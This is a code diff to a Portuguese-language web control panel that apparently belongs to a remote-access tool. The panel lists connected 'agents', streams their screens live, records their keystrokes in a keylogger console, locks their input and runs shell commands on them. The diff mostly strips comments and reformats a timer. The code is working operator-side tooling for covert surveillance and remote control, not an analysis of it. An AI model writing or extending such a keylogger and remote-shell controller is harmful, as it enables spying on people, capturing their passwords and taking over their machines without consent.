@@ -65,7 +65,6 @@
             <span id="drops">Frames pulados: 0</span>
         </div>
 
-        <!-- SEÇÃO DE CONTROLE AVANÇADO (LOCK & SHELL) -->
         <div id="advancedControls" class="advanced-section" style="display:none;">
             <h3>Controle de Sistema</h3>
             <div class="row">
@@ -84,7 +83,6 @@
             </div>
         </div>
 
-        <!-- CONTAINER DO KEYLOG -->
         <div class="keylog-container" id="keylogContainer">
             <h3 style="margin-top:0">Console de Eventos (Keylogger)</h3>
             <div id="keylogList"></div>
@@ -96,7 +94,6 @@
 // --- VARIÁVEIS E CONFIGURAÇÃO ---
 const wsUrlEl=document.getElementById('wsUrl'),tokenEl=document.getElementById('token'),connectBtn=document.getElementById('connectBtn'),connStatus=document.getElementById('connStatus'),agentsEl=document.getElementById('agents'),canvas=document.getElementById('screen'),ctx=canvas.getContext('2d',{alpha:false}),fpsEl=document.getElementById('fps'),bitrateEl=document.getElementById('bitrate'),framesEl=document.getElementById('frames'),dropsEl=document.getElementById('drops'),profileEl=document.getElementById('profile'),applyProfile=document.getElementById('applyProfile'),controlBanner=document.getElementById('controlBanner'),screenWrap=document.getElementById('screenWrap'),keylogList=document.getElementById('keylogList');
 
-// Variáveis de Controle Avançado
 const advancedControls=document.getElementById('advancedControls'),btnLockInput=document.getElementById('btnLockInput'),btnUnlockInput=document.getElementById('btnUnlockInput'),lockStatusText=document.getElementById('lockStatus'),shellCommandInput=document.getElementById('shellCommand'),btnExecuteShell=document.getElementById('btnExecuteShell'),shellOutput=document.getElementById('shellOutput');
 
 let ws=null,agents=[],selectedAgentId=null,frames=0,fpsFrames=0,lastFps=performance.now(),bytesSecond=0,dropped=0,decoding=false,pendingFrame=null;
@@ -106,7 +103,6 @@ wsUrlEl.value=localStorage.getItem('em_ws')||'';tokenEl.value=localStorage.getIt
 function setStatus(t,c=''){connStatus.textContent=t;connStatus.className='status '+c}
 function send(o){if(ws?.readyState===WebSocket.OPEN)ws.send(JSON.stringify(o))}
 
-// --- FUNÇÕES AUXILIARES ---
 function esc(v=''){return String(v).replaceAll('&','&amp;').replaceAll('<','&lt;').replaceAll('>','&gt;').replaceAll('"','&quot;').replaceAll("'",'&#039;')}
 
 // --- MÓDULO DE KEYLOG ---
@@ -125,7 +121,7 @@ function renderAgents(){
     agentsEl.innerHTML=agents.map(a=>`<div class="card"><div class="agent-title">${esc(a.name)} — ${esc(a.user)}</div><div class="small">${esc(a.id)} ${a.version?`· <span class="badge">${esc(a.version)}</span>`:''}</div><br><div>${a.accessActive?'🟢 acesso ativo':'⚪ conectado'} · ${a.controlActive?'🔴 controle ativo':'controle inativo'} · espectadores: ${a.watchers??0}</div><br><button onclick="requestAccess('${a.id}')">Solicitar acesso</button> <button onclick="watchAgent('${a.id}')">Ver ao vivo</button> <button onclick="requestControl('${a.id}')">Solicitar controle</button> <button onclick="endControl('${a.id}')">Encerrar controle</button> <button onclick="endAccess('${a.id}')">Encerrar tudo</button></div>`).join('');
     const s=agents.find(a=>a.id===selectedAgentId);
     controlBanner.className='control-banner'+(s?.controlActive?' active':'');
-    advancedControls.style.display = s ? 'block' : 'none'; // Mostra controle se houver agente selecionado
+    advancedControls.style.display = s ? 'block' : 'none';
 }
 
 window.requestAccess=id=>send({type:'request_access',agentId:id});
@@ -165,7 +161,6 @@ connectBtn.onclick=()=>{const url=wsUrlEl.value.trim(),token=tokenEl.value;local
         if(m.type==='admin_ready'){setStatus('Conectado','ok');agents=m.agents||[];renderAgents();return}
         if(m.type==='agent_list'){agents=m.agents||[];renderAgents();return}
         
-        // --- TRATAMENTO DE RESPOSTAS DO AGENTE ---
         if(m.type === 'keylog') {
             addKeylogEntry(m.key, m.down, m.ts || new Date().toLocaleTimeString());
             return;
@@ -185,7 +180,6 @@ connectBtn.onclick=()=>{const url=wsUrlEl.value.trim(),token=tokenEl.value;local
         }
         return;
     }
-    // Frames de vídeo (binário)
     bytesSecond+=ev.data.byteLength||0;queueFrame(ev.data);
 };
 ws.onclose=()=>setStatus('Desconectado','bad');ws.onerror=()=>setStatus('Erro de conexão','bad')};
@@ -193,4 +187,17 @@ ws.onclose=()=>setStatus('Desconectado','bad');ws.onerror=()=>setStatus('Erro de
 // --- VÍDEO (RENDERIZAÇÃO) ---
 function queueFrame(buf){if(decoding){pendingFrame=buf;dropped++;dropsEl.textContent='Frames pulados no navegador: '+dropped;return}decodeFrame(buf)}
 async function decodeFrame(buf){decoding=true;try{const bmp=await createImageBitmap(new Blob([buf],{type:'image/jpeg'}));if(canvas.width!==bmp.width||canvas.height!==bmp.height){canvas.width=bmp.width;canvas.height=bmp.height}ctx.drawImage(bmp,0,0);bmp.close();frames++;fpsFrames++;framesEl.textContent='Frames: '+frames}catch{}finally{decoding=false;if(pendingFrame){const next=pendingFrame;pendingFrame=null;decodeFrame(next)}}}
-setInterval(()=>{const now=performance.now(),fps=fpsFrames*1000/(now-lastFps);fpsEl.textContent='FPS: '+fps.toFixed(1);bitrateEl.textContent='Recebimento: '+(bytesSecond*8/1000000).toFixed(2)+' Mbps';fpsFrames=0;bytesSecond=0;lastFps=now},100
+
+setInterval(()=>{
+    const now=performance.now();
+    const fps=fpsFrames*1000/(now-lastFps);
+    fpsEl.textContent='FPS: '+fps.toFixed(1);
+    bitrateEl.textContent='Recebimento: '+(bytesSecond*8/1000000).toFixed(2)+' Mbps';
+    fpsFrames=0;
+    bytesSecond=0;
+    lastFps=now;
+}, 1000);
+
+</script>
+</body>
+</html>
